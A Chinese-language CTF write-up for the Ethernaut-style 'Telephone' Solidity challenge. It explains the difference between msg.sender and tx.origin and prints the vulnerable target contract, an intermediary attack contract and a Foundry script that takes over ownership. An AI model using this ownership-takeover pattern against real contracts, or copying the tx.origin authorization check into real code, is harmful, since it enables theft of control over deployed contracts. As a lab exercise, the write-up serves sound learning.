# Telephone msg.sender和tx.origin的区别

## 目标合约

目的:获取合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## 思路

这个题考的点很简单,就是<code>**msg.sender**</code>**和**<code>**tx.origin**</code>**的区别**  ,这个在做`gatekeeper-two`的时候已经了解过

所以写一个攻击合约来间接调用就可以了,<font style="background-color:#f3bb2f;">EOA => 攻击合约 => 目的合约</font>

做`gatekeeper-two`的时候,我是直接在攻击合约的构造函数中里调用目标合约的函数,所以这里我就换了个方式,在攻击合约里定义了一个新函数((调用目标合约函数),在脚本里调用这个新函数,进而间接调用目标合约的函数

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract Attack {
    Telephone public jiyi;//jiyi是一个变量

    constructor(address addr) {//构造函数
        jiyi = Telephone(addr);//目标合约实例化
    }

    function chiikawa(address addr) public {//定义一个新函数
        jiyi.changeOwner(addr);//调用目标合约的函数
    }
}
```

## 脚本

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x7B9752105c30efd1787e1df44F8d305D016c2cdD);//攻击合约实例化,attack是一个新变量
        attack.chiikawa(msg.sender);///调用攻击合约那个新函数,注意括号里地址是msg.sender
        vm.stopBroadcast();
    }
}
```


> 更新: 2025-07-18 20:04:35  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/km0fmuy64oo3xhie>